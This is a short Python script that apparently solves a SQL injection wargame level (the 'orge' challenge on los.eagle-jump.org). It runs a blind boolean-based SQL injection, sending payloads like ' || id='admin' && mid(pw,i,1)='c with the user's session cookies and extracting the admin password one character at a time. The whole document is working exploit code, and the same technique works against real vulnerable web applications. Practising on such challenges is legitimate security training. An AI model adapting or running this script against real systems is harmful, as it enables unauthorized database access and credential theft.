import urllib.parse
import http.client

HTTP=http.client.HTTPConnection("los.eagle-jump.org")
Url="/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
Headers={"Cookie":"__cfduid=[your Own cfduid]; PHPSESSID=[your Own PHPSESSID]"} #check your own cookie then insert the correct value to make connection success, or you will get nothing return.
Passwd=""
 
for i in range(len(Passwd)+1,100):
    for c in "0123456789abcdefghijklmnopqrstuvwxyz+":

        Payload="' || id='admin' && mid(pw,"+str(i)+",1)='"+c

        HTTP.request("GET",Url+urllib.parse.quote(Payload),"",Headers)

        #print (Payload)
                
        if (b"Hello admin" in HTTP.getresponse().read()):
            Passwd+=c
            print ("[+] Found: %c" % c)

            HTTP.request("GET",Url+urllib.parse.quote(Passwd),"",Headers)
            if (b"Clear" in HTTP.getresponse().read()):
                print ("[*] Password: %s" % Passwd)
                break

print ("[!] Not Found")
print ("[*] Password: %s" % Passwd)